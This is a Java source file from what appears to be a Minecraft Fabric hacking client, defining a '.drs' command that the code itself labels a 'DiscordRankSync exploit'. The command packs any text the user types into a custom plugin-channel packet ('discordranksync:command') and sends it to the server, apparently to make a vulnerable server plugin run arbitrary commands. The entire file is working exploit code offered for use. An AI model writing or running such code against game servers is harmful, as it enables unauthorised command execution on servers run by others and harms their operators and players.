package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.network.PacketByteBuf;
import io.netty.buffer.Unpooled;

import static net.minecraft.client.command.CommandManager.literal;
import static net.minecraft.client.command.CommandManager.argument;

public class DiscordRankSync extends Command {
    public DiscordRankSync(MinecraftClient minecraftClient) {
        super("drs", "DiscordRankSync exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
            .executes(this::showUsage)
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand));
    }

    private int executeCommand(CommandContext<CommandSource> context) {
        String command = StringArgumentType.getString(context, "command");
        
        // Create proper payload
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        buf.writeString(command);
        
        Identifier channel = new Identifier("discordranksync", "command");
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);
        
        Helper.sendPacket(packet);
        Helper.printChatMessage("Discord rank command executed!");
        return 1;
    }

    private int showUsage(CommandContext<CommandSource> context) {
        Helper.printChatMessage("Usage: .drs <command>");
        return 1;
    }
}
